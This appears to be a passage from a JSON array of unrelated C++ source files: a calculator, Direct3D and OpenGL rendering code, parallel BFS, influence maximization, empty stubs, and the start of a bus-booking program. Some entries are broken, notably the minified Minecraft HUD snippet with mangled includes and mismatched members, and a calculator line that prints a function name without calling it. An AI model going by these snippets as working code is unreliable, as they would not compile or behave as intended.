2;//\u0441\u043e\u0437\u0434\u0430\u043b \u043e\u0442\u0434\u0435\u043b\u044c\u043d\u0443\u044e \u043f\u0435\u0440\u0435\u043c\u0435\u043d\u043d\u0443\u044e \u0434\u043b\u044f \u043f\u0440\u043e\u0438\u0437\u0432\u0435\u0434\u0435\u043d\u0438\u044f, \u043d\u0430 \u0441\u043b\u0443\u0447\u0430\u0439, \u0435\u0441\u043b\u0438 \u0444\u0443\u043d\u043a\u0446 \u0441\u043a\u0440\u0442 \u0431\u0443\u0434\u0435\u0442 \r\n\t//\u0440\u0443\u0433\u0430\u0442\u0441\u044f \u043d\u0430 \u043f\u0440\u0438\u0441\u0442\u0443\u0442\u0441\u0432\u0438\u0435 \u043e\u043f\u0440\u0435\u0442\u043e\u0440\u0430 \u0432 \u0441\u043a\u043e\u0431\u043a\u0430\u0445(\u043a\u043e\u0442\u043e\u0440\u044b\u0435 \u043f\u043e \u0438\u0434\u0435\u0435\u0435 \u0434\u043b\u044f \u0430\u0440\u0433\u0443\u043c\u0435\u043d\u0442\u043e\u0432)\r\n\r\n\treturn y * sqrt(under_root);\r\n}\r\n\r\ndouble three_sin_2_cos_3(double x, double y, double PI) {\r\n\tdouble radians_x = x * PI / 180;\r\n\tdouble dbld_radians_x = radians_x * 2;\r\n\r\n\tdouble radians_y = y * PI / 180;\r\n\tdouble trpld_radians_y = radians_y * 3;\r\n\r\n\r\n\treturn 3 * sin(dbld_radians_x) * cos(trpld_radians_y);\r\n}\r\n\r\ndouble minus_fifth_sqrt_in_sqrt(double x, double y) {\r\n\treturn -5 * sqrt(x + sqrt(y));\r\n}\r\n\r\n\r\n\r\nint main() {\r\n    // \u043f\u0435\u0440\u0435\u043c\u0435\u043d\u043d\u0430\u044f \u041f\u0418 \u043d\u0443\u0436\u043d\u0430, \u0434\u043b\u044f \u0438\u0441\u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u043d\u0438\u044f \u0442\u0440\u0438\u0433\u043e\u043d\u043e\u043c\u0435\u0442\u0440\u0438\u0447\u0435\u0441\u043a\u0438\u0445 \u0444\u0443\u043d\u043a\u0446. \u043d\u0443 \u0442\u0438\u043f\u0430, \u0447\u0442\u043e\u0431 \u0432  \u0440\u0430\u0434\u0438\u0430\u043d\u044b \u043f\u0435\u0440\u0435\u0432\u0435\u0441\u0442\u0438.\r\n    const double PI = 3.14159265358979323846;\r\n    // \u043f\u0435\u0440\u0435\u043c\u0435\u043d\u043d\u0430\u044f \u0441\u0442\u0430\u0440\u0442 \u043e\u0442\u0432\u0435\u0447\u0430\u0435\u0442 \u0437\u0430 \u043e\u0441\u043d\u043e\u0432\u043d\u043e\u0439 \u0446\u0438\u043a\u043b\r\n    int start;\r\n    cout << \"Enter '1' to start(type '0' to stop): \\n\";\r\n\r\n\r\n    while (true) {\r\n        cout << \"\\n choose action! \\n\";\r\n        cout << \"\\n 1- (x2), 2- (x^2), 3-(|x|) ,4-(sinx),5-(x^2 * (-7.5)) ,6- (sqrt(x) * 3),7- (sin(x) * cos(y) + sin(y) * cos(x)) \\n\";\r\n        cin >> start;\r\n\t\tdouble x, y;\r\n\r\n        if (start == 0) {//\u0432\u044b\u0445\u043e\u0434 \u0438\u0437 \u043f\u0440\u043e\u0433\u0438\r\n            break;\r\n        }\r\n        else if (start == 1) {//\u0443\u043c\u043d\u043e\u0436\u0435\u043d\u0438\u0435 \u043d\u0430 2\r\n\t\t\tcin >> x;\r\n\r\n\t\t\tcout << \" \" << x << \" *2 = \" << on2(x) << endl;\r\n        }\r\n\t\telse if (start == 2) {//\u0432\u043e\u0437\u0432\u0435\u0434\u0435\u043d\u0438\u0435 \u0432 \u043a\u0432\u0430\u0434\u0440\u0430\u0442\r\n\t\t\tcin >> x;\r\n\r\n\t\t\tcout << \" \" << x << \"^2 = \" <<  in2(x) << endl;\r\n\t\t}\r\n\t\telse if (start == 3) {// \u043c\u043e\u0434\u0443\u043b\u044c\r\n\t\t\tcin >> x;\r\n\r\n\t\t\tcout << \" |\" << x << \"| = \" << module(x) << endl;\r\n\t\t}\r\n\t\telse if (start == 4) {//\u0441\u0438\u043d\u0443\u0441\r\n\t\t\tcin >> x;\r\n\r\n\t\t\tcout << \" sin(\" << x << \") = \" << sin2(x, PI) << endl;//\u0442\u0443\u0442 \u041f\u0418 \u043f\u0440\u0438\u043d\u0438\u043c\u0430\u0435\u0442\u0441\u044f \u041e\u0411\u042f\u0417\u0410\u0422\u0415\u041b\u042c\u041d\u041e \u0432\u0442\u043e\u0440\u044b\u043c \u0430\u0440\u0433\u0443\u043c\u0435\u043d\u0442\u043e\u043c\r\n\t\t}\r\n\t\telse if (start == 5) {//\u0438\u043a\u0441 \u0432 \u043a\u0432\u0430\u0434\u0440\u0430\u0442\u0435 \u0443\u043c\u043d\u043e\u0436\u0438\u0442\u044c \u043d\u0430 \u043c\u0438\u043d\u0443\u0441 \u0441\u0435\u043c\u044c \u0446\u0435\u043b\u044b\u0445 \u043f\u044f\u0442\u044c \u0434\u0435\u0441\u0442\u044f\u044b\u0445\r\n\t\t\tcin >> x;\r\n\r\n\t\t\tcout << \" \" << x << \" ^ 2 * (-7.5) = \" << minus_seven_and_half_squared(x) << endl;\r\n\t\t}\r\n\t\telse if (start == 6) {\r\n\t\t\tcin >> x;\r\n\r\n\t\t\tcout << \" (sqrt(\" << x << \") * 3 \" << three_sqrt << endl;\r\n\t\t}\r\n\t\telse if (start == 7) {\r\n\t\t\tcin >> x;\r\n\t\t\tcout << \"\\n\";\r\n\t\t\tcin >> y;\r\n\r\n\t\t\tcout << \" (sin(\" << x << \")* cos(\" << y << \") + sin(\" << y << \")* cos(\" << x << \")) \\n\" << sinl_plus_b(x, y, PI);\r\n\t\t}\r\n    }\r\n\r\n\r\n    return 0;\r\n}",
    "////////////////////////////////////////////////////////////////////////////////\n// Filename: d3dclass.cpp\n////////////////////////////////////////////////////////////////////////////////\n#include \"d3dclass.h\"\n\n\nD3DClass::D3DClass()\n{\n\tm_swapChain = 0;\n\tm_device = 0;\n\tm_deviceContext = 0;\n\tm_renderTargetView = 0;\n\tm_depthStencilBuffer = 0;\n\tm_depthStencilState = 0;\n\tm_depthStencilView = 0;\n\tm_rasterState = 0;\n}\n\n\nD3DClass::D3DClass(const D3DClass& other)\n{\n}\n\n\nD3DClass::~D3DClass()\n{\n}\n\n\nbool D3DClass::Initialize(int screenWidth, int screenHeight, bool vsync, HWND hwnd, bool fullscreen, float screenDepth, float screenNear)\n{\n\tHRESULT result;\n\tIDXGIFactory* factory;\n\tIDXGIAdapter* adapter;\n\tIDXGIOutput* adapterOutput;\n\tunsigned int numModes, i, numerator, denominator;\n\tunsigned long long stringLength;\n\tDXGI_MODE_DESC* displayModeList;\n\tDXGI_ADAPTER_DESC adapterDesc;\n\tint error;\n\tDXGI_SWAP_CHAIN_DESC swapChainDesc;\n\tD3D_FEATURE_LEVEL featureLevel;\n\tID3D11Texture2D* backBufferPtr;\n\tD3D11_TEXTURE2D_DESC depthBufferDesc;\n\tD3D11_DEPTH_STENCIL_DESC depthStencilDesc;\n\tD3D11_DEPTH_STENCIL_VIEW_DESC depthStencilViewDesc;\n\tD3D11_RASTERIZER_DESC rasterDesc;\n\tfloat fieldOfView, screenAspect;\n\n\n\t// Store the vsync setting.\n\tm_vsync_enabled = vsync;\n\n\t// Create a DirectX graphics interface factory.\n\tresult = CreateDXGIFactory(__uuidof(IDXGIFactory), (void**)&factory);\n\tif (FAILED(result))\n\t{\n\t\treturn false;\n\t}\n\n\t// Use the factory to create an adapter for the primary graphics interface (video card).\n\tresult = factory->EnumAdapters(0, &adapter);\n\tif (FAILED(result))\n\t{\n\t\treturn false;\n\t}\n\n\t// Enumerate the primary adapter output (monitor).\n\tresult = adapter->EnumOutputs(0, &adapterOutput);\n\tif (FAILED(result))\n\t{\n\t\treturn false;\n\t}\n\n\t// Get the number of modes that fit the DXGI_FORMAT_R8G8B8A8_UNORM display format for the adapter output (monitor).\n\tresult = adapterOutput->GetDisplayModeList(DXGI_FORMAT_R8G8B8A8_UNORM, DXGI_ENUM_MODES_INTERLACED, &numModes, NULL);\n\tif (FAILED(result))\n\t{\n\t\treturn false;\n\t}\n\n\t// Create a list to hold all the possible display modes for this monitor/video card combination.\n\tdisplayModeList = new DXGI_MODE_DESC[numModes];\n\tif (!displayModeList)\n\t{\n\t\treturn false;\n\t}\n\n\t// Now fill the display mode list structures.\n\tresult = adapterOutput->GetDisplayModeList(DXGI_FORMAT_R8G8B8A8_UNORM, DXGI_ENUM_MODES_INTERLACED, &numModes, displayModeList);\n\tif (FAILED(result))\n\t{\n\t\treturn false;\n\t}\n\n\t// Now go through all the display modes and find the one that matches the screen width and height.\n\t// When a match is found store the numerator and denominator of the refresh rate for that monitor.\n\tfor (i = 0; i < numModes; i++)\n\t{\n\t\tif (displayModeList[i].Width == (unsigned int)screenWidth)\n\t\t{\n\t\t\tif (displayModeList[i].Height == (unsigned int)screenHeight)\n\t\t\t{\n\t\t\t\tnumerator = displayModeList[i].RefreshRate.Numerator;\n\t\t\t\tdenominator = displayModeList[i].RefreshRate.Denominator;\n\t\t\t}\n\t\t}\n\t}\n\n\t// Get the adapter (video card) description.\n\tresult = adapter->GetDesc(&adapterDesc);\n\tif (FAILED(result))\n\t{\n\t\treturn false;\n\t}\n\n\t// Store the dedicated video card memory in megabytes.\n\tm_videoCardMemory = (int)(adapterDesc.DedicatedVideoMemory / 1024 / 1024);\n\n\t// Convert the name of the video card to a character array and store it.\n\terror = wcstombs_s(&stringLength, m_videoCardDescription, 128, adapterDesc.Description, 128);\n\tif (error != 0)\n\t{\n\t\treturn false;\n\t}\n\n\t// Release the display mode list.\n\tdelete[] displayModeList;\n\tdisplayModeList = 0;\n\n\t// Release the adapter output.\n\tadapterOutput->Release();\n\tadapterOutput = 0;\n\n\t// Release the adapter.\n\tadapter->Release();\n\tadapter = 0;\n\n\t// Release the factory.\n\tfactory->Release();\n\tfactory = 0;\n\n\t// Initialize the swap chain description.\n\tZeroMemory(&swapChainDesc, sizeof(swapChainDesc));\n\n\t// Set to a single back buffer.\n\tswapChainDesc.BufferCount = 1;\n\n\t// Set the width and height of the back buffer.\n\tswapChainDesc.BufferDesc.Width = screenWidth;\n\tswapChainDesc.BufferDesc.Height = screenHeight;\n\n\t// Set regular 32-bit surface for the back buffer.\n\tswapChainDesc.BufferDesc.Format = DXGI_FORMAT_R8G8B8A8_UNORM;\n\n\t// Set the refresh rate of the back buffer.\n\tif (m_vsync_enabled)\n\t{\n\t\tswapChainDesc.BufferDesc.RefreshRate.Numerator = numerator;\n\t\tswapChainDesc.BufferDesc.RefreshRate.Denominator = denominator;\n\t}\n\telse\n\t{\n\t\tswapChainDesc.BufferDesc.RefreshRate.Numerator = 0;\n\t\tswapChainDesc.BufferDesc.RefreshRate.Denominator = 1;\n\t}\n\n\t// Set the usage of the back buffer.\n\tswapChainDesc.BufferUsage = DXGI_USAGE_RENDER_TARGET_OUTPUT;\n\n\t// Set the handle for the window to render to.\n\tswapChainDesc.OutputWindow = hwnd;\n\n\t// Turn multisampling off.\n\tswapChainDesc.SampleDesc.Count = 1;\n\tswapChainDesc.SampleDesc.Quality = 0;\n\n\t// Set to full screen or windowed mode.\n\tif (fullscreen)\n\t{\n\t\tswapChainDesc.Windowed = false;\n\t}\n\telse\n\t{\n\t\tswapChainDesc.Windowed = true;\n\t}\n\n\t// Set the scan line ordering and scaling to unspecified.\n\tswapChainDesc.BufferDesc.ScanlineOrdering = DXGI_MODE_S",
    "#include <iostream>\nusing namespace std;\n#include <GL/glew.h>\n#include <GLFW/glfw3.h>\n#include <glm/glm.hpp>\n#include <glm/gtc/matrix_transform.hpp>\nusing namespace glm;\n#include <vector>\n#include <limits>\n#include \"common/utils.hpp\"\n#include <fstream>\n#include <sstream>\n#include <common/controls.hpp>\n#define STB_IMAGE_IMPLEMENTATION\n#include \"stb_image.h\"\nGLFWwindow* window;\nstatic const int window_width = 1920;\nstatic const int window_height = 1080;\nconst unsigned int width = 800;\nconst unsigned int height = 800;\nstatic const int n_points = 200; //minimum 2\nstatic const float m_scale = 5;\nGLuint VertexArrayID;\nGLuint vertexbuffer;\nGLuint skyboxVAO;\nGLuint skyboxVBO;\nGLuint skyboxEBO;\nGLuint uvbuffer;\nGLuint normalmapID;\nGLuint elementbuffer;\nGLuint tangentbuffer;\nGLuint textureID;\nGLuint heightTextureID;\nGLuint programID;\nGLuint skyboxprogramID;\nGLuint billboardprogramID;\nGLuint stextureID;\nGLuint shadingmapID;\nGLuint grassID;\nGLuint snowID;\nGLuint grassnormalID;\nGLuint grassrID;\nGLuint snownID;\nGLuint snowrID;\nunsigned int nIndices;\n\n\nbool initializeGL()\n{// Initialise GLFW\n\tif (!glfwInit())\n\t{\n\t\tcerr << \"Failed to initialize GLFW\" << endl;\n\t\treturn false;\n\t}\n\tglfwWindowHint(GLFW_SAMPLES, 1); //no anti-aliasing\n\tglfwWindowHint(GLFW_CONTEXT_VERSION_MAJOR, 4);\n\tglfwWindowHint(GLFW_CONTEXT_VERSION_MINOR, 5);\n\tglfwWindowHint(GLFW_OPENGL_FORWARD_COMPAT, GL_TRUE); // To make MacOS happy;\n\tglfwWindowHint(GLFW_OPENGL_PROFILE, GLFW_OPENGL_CORE_PROFILE);\n\twindow = glfwCreateWindow(window_width, window_height, \"OpenGLRenderer\", NULL, NULL);\n\tif (window == NULL)\n\t{\n\t\tcerr << \"Failed to open GLFW window. If you have an Intel GPU, they may not be 4.5compatible.\" << endl;\n\t\tglfwTerminate();\n\t\treturn false;\n\t}\n\tglfwMakeContextCurrent(window);\n\t// Initialize GLEW\n\tglewExperimental = true;// Needed for core profile\n\tif (glewInit() != GLEW_OK)\n\t{\n\t\tcerr << \"Failed to initialize GLEW\" << endl;\n\t\tglfwTerminate();\n\t\treturn false;\n\t}\n\t//without\n\tint NumberOfExtensions;\n\tglGetIntegerv(GL_NUM_EXTENSIONS, &NumberOfExtensions);\n\tfor (int i = 0; i < NumberOfExtensions; i++) {\n\t\tconst GLubyte* ccc = glGetStringi(GL_EXTENSIONS, i);\n\t\tif (strcmp(reinterpret_cast<const char*>(ccc), \"GL_ARB_debug_output\") != 0)//1.2\n\t\t{\n\t\t\treturn -1;\n\t\t}\n\t}\n\t//with\n\tif (!GLEW_ARB_debug_output)\n\t\treturn -1;\n\tglfwSetInputMode(window, GLFW_STICKY_KEYS, GL_TRUE);\n\tglfwSetInputMode(window, GLFW_CURSOR, GLFW_CURSOR_DISABLED);\n\tglfwPollEvents();\n\tglfwSetCursorPos(window, window_width / 2, window_height / 2);\n}\n\nvoid LoadHeight()\n{\n\tint heightWidth, heightHeight;\n\tunsigned char* heightData = nullptr;\n\tloadBMP_custom(\"mountains_height.bmp\", heightWidth, heightHeight, heightData);\n\tglGenTextures(1, &heightTextureID);\n\tglBindTexture(GL_TEXTURE_2D, heightTextureID);\n\tglPixelStorei(GL_UNPACK_ALIGNMENT, 4);\n\tglTexImage2D(GL_TEXTURE_2D, 0, GL_RGB, heightWidth, heightHeight, 0, GL_BGR, GL_UNSIGNED_BYTE, heightData);\n\tdelete[] heightData;\n\tglTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_WRAP_S, GL_CLAMP_TO_BORDER);\n\tglTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_WRAP_T, GL_CLAMP_TO_BORDER);\n\tglTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MAG_FILTER, GL_NEAREST);\n\tglTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MIN_FILTER, GL_NEAREST);\n\tglBindTexture(GL_TEXTURE_2D, 0);\n}\n\nvoid LoadNormalMap()\n{\n\tint normalmapWidth, normalmapHeight;\n\tunsigned char* normalmapData = nullptr;\n\tloadBMP_custom(\"rocks-n.bmp\", normalmapWidth, normalmapHeight, normalmapData);\n\tglGenTextures(1, &normalmapID);\n\tglBindTexture(GL_TEXTURE_2D, normalmapID);\n\tglPixelStorei(GL_UNPACK_ALIGNMENT, 4);\n\tglTexImage2D(GL_TEXTURE_2D, 0, GL_RGB, normalmapWidth, normalmapHeight, 0, GL_BGR, GL_UNSIGNED_BYTE, normalmapData);\n\tdelete[] normalmapData;\n\tglTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_WRAP_S, GL_REPEAT);\n\tglTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_WRAP_T, GL_REPEAT);\n\tglTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MAG_FILTER, GL_NEAREST);\n\tglTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MIN_FILTER, GL_NEAREST);\n\tglBindTexture(GL_TEXTURE_2D, 0);\n}\n\nvoid LoadModel()\n{\n\tstd::vector<glm::vec3> vertices;\n\tstd::vector<glm::vec2> uvs;\n\tstd::vector<unsigned int> indices;\n\tstd::vector<glm::vec3> normals;\n\tfor (int i = 0; i < n_points; i++)\n\t{\n\t\tfloat x = (m_scale) * ((i / float(n_points - 1)) - 0.5f) * 2.0f;\n\t\tfor (int j = 0; j < n_points; j++)\n\t\t{\n\t\t\tfloat z = (m_scale) * ((j / float(n_points - 1)) - 0.5f) * 2.0f;\n\t\t\tfloat u = float(i + 0.5f) * 0.99 / float(n_points - 1);\n\t\t\tfloat v = float(j + 0.5f) * 0.99 / float(n_points - 1);\n\t\t\tvertices.push_back(vec3(x, 0, z));\n\t\t\tuvs.push_back(vec2(u, v));\n\t\t}\n\t}\n\t//glEnable(GL_PRIMITIVE_RESTART);\n\t//constexpr unsigned int restartIndex = std::numeric_limits<std::uint32_t>::max();\n\t//glPrimitiveRestartIndex(restartIndex);\n\t//int n = 0;\n\n\tfor (int i = 0; i < n_points-1; i++)\n\t{\n\t\tfor (int j = 0; j < n_points-1; j++)\n\t\t{\n\t\t\tint index = i * n_points + j;\n\t\t\t//unsigned int topLeft = n;\n\t\t\t//unsigned int bottomLeft = topLeft + n_points;\n\t\t\tindices.push_back(index);\n\t\t\tindices.push_back(index + 1);\n\t\t\tindices.push_b",
    "#include \"bfs.h\"\r\n#include \"ThreadPool.h\"\r\n#include <mutex>\r\n#include <vector>\r\n#include <queue>\r\n\r\n\r\n/**\r\n * Performs BFS from a given start vertex and updates the shortest path matrix `m`.\r\n * @param graph The graph to traverse.\r\n * @param startVertex The starting vertex for BFS.\r\n * @param m The matrix to store the shortest paths.\r\n * @param m_mtx Mutex for synchronizing access to the matrix.\r\n */\r\nvoid bfsFromVertex(Graph *graph, int startVertex, int **m, std::mutex &m_mtx) {\r\n    // Keeps track of visited vertices to avoid revisiting them\r\n    std::vector<bool> visited(graph->numVertices, false);\r\n\r\n    // Queue to manage the BFS traversal. Store pairs of vertex and its depth.\r\n    std::queue<std::pair<int, int>> q;\r\n\r\n    // Mark the starting vertex as visited and enqueue it with depth 0\r\n    visited[startVertex] = true;\r\n    q.push({startVertex, 0});\r\n\r\n    // Process the queue until it's empty\r\n    while (!q.empty()) {\r\n        // Extract the vertex and its depth from the queue\r\n        int v = q.front().first;\r\n        int depth = q.front().second;\r\n        q.pop();\r\n\r\n        // Lock the mutex before accessing the shared matrix\r\n        std::lock_guard<std::mutex> lock(m_mtx);\r\n        // Update the distance of the vertex from the start vertex in the matrix\r\n        m[startVertex][v] = depth;\r\n\r\n        // Explore all adjacent vertices\r\n        for (node *adj = graph->adjacencyLists[v]; adj != nullptr; adj = adj->next) {\r\n            int adjVertex = adj->v;\r\n            // If the adjacent vertex has not been visited, mark it visited and enqueue it\r\n            if (!visited[adjVertex]) {\r\n                visited[adjVertex] = true;\r\n                // Enqueue the adjacent vertex with a depth incremented by 1\r\n                q.push({adjVertex, depth + 1});\r\n\r\n                // Note: As we enqueue each adjacent vertex, we increase the depth by 1.\r\n                // This ensures that vertices enqueued consecutively have a depth difference of at most 1.\r\n                // This is crucial for maintaining the breadth-first nature of the traversal.\r\n            }\r\n        }\r\n    }\r\n}\r\n\r\n/**\r\n * Initializes the shortest path matrix and manages the parallel execution of BFS tasks.\r\n * @param graph The graph on which BFS is performed.\r\n * @param m The matrix to be updated with shortest path distances.\r\n */\r\nvoid bfs(Graph *graph, int **m) {\r\n    // Number of vertices in the graph\r\n    const unsigned int numVertices = graph->numVertices;\r\n    // Create a thread pool with a number of threads equal to the hardware concurrency\r\n    ThreadPool pool(std::thread::hardware_concurrency());\r\n    // Mutex for synchronizing access to the shortest path matrix\r\n    std::mutex m_mtx;\r\n\r\n    // Initialize the shortest path matrix with -1 (infinity)\r\n    for (unsigned int i = 0; i < numVertices; i++) {\r\n        // Set all distances to -1\r\n        std::fill(m[i], m[i] + numVertices, -1);\r\n        // Distance to self is 0\r\n        m[i][i] = 0;\r\n    }\r\n\r\n    // Enqueue BFS tasks for each vertex\r\n    for (int i = 0; i < numVertices; i++) {\r\n        pool.enqueue([graph, i, m, &m_mtx] {\r\n            // Perform BFS from each vertex\r\n            bfsFromVertex(graph, i, m, m_mtx);\r\n        });\r\n    }\r\n\r\n    // The ThreadPool destructor will automatically wait for all tasks to complete\r\n}\r\n",
    "#include <iostream>#include /*<**>#include <**>#include <**>#include <**>#include <**=*/class Health{public:Health():width(0),random(std::mt19937(std::random_device()())){}void onRenderGuiEvent(){if(mc->currentScreen&&(dynamic_cast<GuiInventory*>(mc->currentScreen)||dynamic_cast<GuiChest*>(mc->currentScreen)||dynamic_cast<GuiContainerCreative*>(mc->currentScreen)))renderHealth();}void onRender2DEvent(){if(mc->currentScreen&&!(dynamic_cast<GuiInventory*>(mc->currentScreen))&&!(dynamic_cast<GuiChest*>(mc->currentScreen)))renderHealth();}private:std::mt19937 r;int w;void renderHealth(){auto s=ScaledResolution(mc);auto sc=mc->currentScreen;float aH=mc->thePlayer->getAbsorptionAmount();std::ostringstream ss;ss<<std::fixed<<std::setprecision(1)<<(mc->thePlayer->getHealth()/2.0f)<<\"\u00a7c\\u2764 \"<<(aH<=0.0f?\"\":\"\u00a7e\"+std::to_string(aH/2.0f)+\"\u00a76\\u2764\");int oY=0;if(mc->thePlayer->getHealth()>=0.0f&&mc->thePlayer->getHealth()<10.0f||mc->thePlayer->getHealth()>=10.0f&&mc->thePlayer->getHealth()<100.0f)w=3;if(dynamic_cast<GuiInventory*>(sc))oY=70;else if(dynamic_cast<GuiContainerCreative*>(sc))oY=80;else if(dynamic_cast<GuiChest*>(sc))oY=static_cast<GuiChest*>(sc)->ySize/2-15;int x=s.getScaledWidth()/2-w;int y=s.getScaledHeight()/2+25+oY;auto c=blendColors({0.0f,0.5f,1.0f},{Color(255,37,0),Color(255,255,0),Color(0,255,0)},mc->thePlayer->getHealth()/mc->thePlayer->getMaxHealth());mc->fontRendererObj->drawString(ss.str(),aH>0.0f?static_cast<float>(x)-15.5f:static_cast<float>(x)-3.5f,y,c.getRGB(),true);glPushMatrix();mc->getTextureManager()->bindTexture(Gui::icons);r.seed(static_cast<long>(mc->ingameGUI->updateCounter)*312871L);float w_=static_cast<float>(s.getScaledWidth())/2.0f-mc->thePlayer->getMaxHealth()/2.5f*10.0f/2.0f;float mH=mc->thePlayer->getMaxHealth();int lPH=mc->ingameGUI->lastPlayerHealth;int hI=std::ceil(mc->thePlayer->getHealth());int l2=-1;bool f=mc->ingameGUI->healthUpdateCounter>static_cast<long>(mc->ingameGUI->updateCounter)&&(mc->ingameGUI->healthUpdateCounter-static_cast<long>(mc->ingameGUI->updateCounter))/3L%2L==1L;if(mc->thePlayer->isPotionActive(Potion::regeneration))l2=mc->ingameGUI->updateCounter%std::ceil(mH+5.0f);glColor4f(1.0f,1.0f,1.0f,1.0f);for(int i6=std::ceil(mH/2.0f)-1;i6>=0;--i6){int xO=16;if(mc->thePlayer->isPotionActive(Potion::poison))xO+=36;else if(mc->thePlayer->isPotionActive(Potion::wither))xO+=72;int k3=f?1:0;float rX=w_+static_cast<float>(i6%10*8);float rY=static_cast<float>(s.getScaledHeight())/2.0f+15.0f+static_cast<float>(oY);if(hI<=4)rY+=static_cast<float>(r()%2);if(i6==l2)rY-=2.0f;int yO=mc->theWorld->getWorldInfo()->isHardcoreModeEnabled()?5:0;Gui::drawTexturedModalRect(rX,rY,16+k3*9,9*yO,9,9);if(f){if(i6*2+1<lPH)Gui::drawTexturedModalRect(rX,rY,xO+54,9*yO,9,9);if(i6*2+1==lPH)Gui::drawTexturedModalRect(rX,rY,xO+63,9*yO,9,9);}if(i6*2+1<hI)Gui::drawTexturedModalRect(rX,rY,xO+36,9*yO,9,9);if(i6*2+1!=hI)continue;Gui::drawTexturedModalRect(rX,rY,xO+45,9*yO,9,9);}glPopMatrix();}Color blendColors(const std::vector<float>& keys,const std::vector<Color>& colors,float value){return colors[0];}};class Minecraft{public:class Screen* cs;class Player* tp;class FontRenderer* fro;class TextureManager* getTextureManager(){return nullptr;}class IngameGUI* ig;class World* tw;};class ScaledResolution{public:ScaledResolution(Minecraft* mc){}int getScaledWidth()const{return 800;}int getScaledHeight()const{return 600;}};class GuiInventory{};class GuiChest{int ySize;};class GuiContainerCreative{};class Player{public:float getHealth()const{return 20.0f;}float getMaxHealth()const{return 20.0f;}float getAbsorptionAmount()const{return 0.0f;}bool isPotionActive(int potion)const{return false;}};class FontRenderer{public:void drawString(const std::string& text,float x,float y,int color,bool shadow){}};class TextureManager{};class IngameGUI{public:long uc;long hc;int lPH;};class World{public:class WorldInfo* getWorldInfo(){return nullptr;}};class WorldInfo{public:bool isHardcoreModeEnabled()const{return false;}};class Potion{public:static const int reg=0;static const int poi=1;static const int wit=2;};class Color{public:int r,g,b;Color(int r,int g,int b):r(r),g(g),b(b){}int getRGB()const{return (r<<16)|(g<<8)|b;}};class Gui{public:static void drawTexturedModalRect(float x,float y,int u,int v,int width,int height){}};Minecraft* mc=new Minecraft();int main(){Health health;health.onRenderGuiEvent();health.onRender2DEvent();return 0;}\r\n",
    "#include \"Randomized.h\"\n#include <iostream>\n#include <math.h>\n#include <stdlib.h>\n\nRandomized::Randomized(Network *g) : Streaming(g) {\n  // Calculating ALPHA and EPSILON_TAG\n  Constants::ALPHA =\n      2 / (3 + Constants::BETA - (Constants::BETA / Constants::K));\n  Constants::EPS_TAG =\n      (3 + Constants::BETA - (Constants::BETA / Constants::K)) * Constants::EPS;\n}\n\nRandomized::~Randomized() {}\n\nint Randomized::select_element(int j, uint e, int step) {\n  vector<double> temp_inf(Constants::K), p(Constants::K);\n  uint J_size = 0;\n\n  for (int i = 0; i < Constants::K; ++i) {\n    kseeds tmp_seeds = sub_seeds[j][step];\n    tmp_seeds.push_back(kpoint(e, i));\n    temp_inf[i] = estimate_influence(tmp_seeds);\n    ++no_queries;\n\n    bool critical_cond =\n        sub_seeds_cost[j][step] + cost_matrix[e] <= Constants::BUDGET &&\n        ((temp_inf[i] - influences[j][step]) / cost_matrix[e] >=\n         (Constants::ALPHA * thresholds[j]) / Constants::BUDGET);\n\n    if (critical_cond) {\n      p[i] = (temp_inf[i] - influences[j][step]) / cost_matrix[e];\n      if (p[i] > 0)\n        ++J_size;\n      // p[i] = p[i] >= thresholds[j] ? p[i] : 0;\n    }\n  }\n\n  if (J_size == 0) {\n    return -1;\n  } else if (J_size == 1) {\n    for (int i = 0; i < Constants::K; ++i) {\n      if (p[i] > 0) {\n        influences[j][step] = temp_inf[i];\n        if (influences[j][step] > max_solution)\n          max_solution = influences[j][step];\n        return i;\n      }\n    }\n  } else {\n    double T = 0.0;\n    double sum = 0.0;\n\n    for (int i = 0; i < Constants::K; ++i) {\n      p[i] = pow(p[i], J_size - 1);\n      T += p[i];\n    }\n\n    double random = (double)(rand() % 10000) / 10000 * T;\n    for (int i = 0; i < Constants::K; ++i) {\n      if (sum <= random && random < sum + p[i]) {\n        influences[j][step] = temp_inf[i];\n        max_solution = max(max_solution, influences[j][step]);\n        return i;\n      }\n      sum += p[i];\n    }\n  }\n\n  return -1;\n}\n",
    "#include <chocolite.hpp>\n\nvoid Chocolite::load_container(std::string container_name) {\n    // Find the container and load it into memory\n}\n\nvoid Chocolite::unload_container(std::string container_name) {\n    // Destruct the container here\n}\n\nvoid Chocolite::add_shape_to_container(std::string name, Chocolite::container container) {\n\n}\n\nvoid Chocolite::remove_shape_from_container(std::string name, Chocolite::container container) {\n\n}\n\nvoid Chocolite::move_position_of_container(Chocolite::shape& shape, int pos) {\n\n}\n\nvoid Chocolite::sort_data_on_container(std::string name, std::string &sort_by) {\n\n}\n\nbool Chocolite::shape_exists(std::string name) {\n\n}\n\nvoid Chocolite::transfer_shape_to_container(std::string name, Chocolite::container& new_container) {\n\n}\n\nChocolite::element Chocolite::find_element_from_data(std::any content) {\n\n}\n\nChocolite::shape Chocolite::find_shape_from_data(std::any content) {\n\n}\n\nstd::any Chocolite::select_data_from_shape(std::any content, std::optional<bool> unique_only) {\n\n}\n",
    "#include<bits/stdc++.h>\nusing namespace std;\n\n/* p variable keeps track of number of bus available at the moment.*/\n\nint p = 0;\n\n\nclass a\n{\n  /*Note: Don't use space in input.\n  *busPlateNum can store a input upto length 7 and so on for other attributes.\n  *Here seatNumber is no. of seats in a bus, seatNumber is matrix type char i.e, seatNumber[8][4] have 4 columns and 8 rows i.e,\n  8*4=32 seats in total, while seatNumber[8][4][10] means each of the seatNumber can store a nameOfPassenger with 10 characters each*/\n  char busn[10], driver[25], arrival[15], depart[15], from[25], to[25], seat[8][4][10];\n\npublic:\n\n  void addNewBus();\n\n  void allotmentOfSeatToPassenger();\n\n  void empty();\n\n  void showAvailableBusSeats();\n\n  void showAvailableBuses();\n\n  void showReservedBusSeats(int i);\n\n}\nbus[25];\n\n\nvoid vline(char ch)\n{\n\n  for (int i=100;i>0;i--){\n    cout<<ch;\n  }\n  cout<<endl;\n\n}\n\nvoid a::addNewBus()\n{\n\n  cout<<\"Enter bus no: 